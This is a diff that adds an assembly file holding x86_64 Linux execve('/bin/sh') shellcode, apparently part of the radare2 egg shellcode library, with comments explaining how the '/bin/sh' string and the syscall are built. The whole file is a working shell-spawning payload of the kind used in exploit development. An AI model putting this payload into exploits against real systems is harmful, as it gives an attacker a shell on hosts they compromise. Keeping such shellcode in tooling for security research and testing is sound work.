@@ -1,0 +1,17 @@
+; x86_64 (64-bit) execve /bin/sh shellcode
+; Assembly equivalent of the bytes originally stored in
+; libr/egg/p/sc/src/x86_64-linux-binsh.c
+
+xor eax, eax
+movabs rbx, 0xff978cd091969dd1
+neg rbx              ; results in /bin/sh string
+push rbx
+push rsp
+pop rdi
+cdq
+push rdx
+push rdi
+push rsp
+pop rsi
+mov al, 0x3b        ; execve syscall number
+syscall
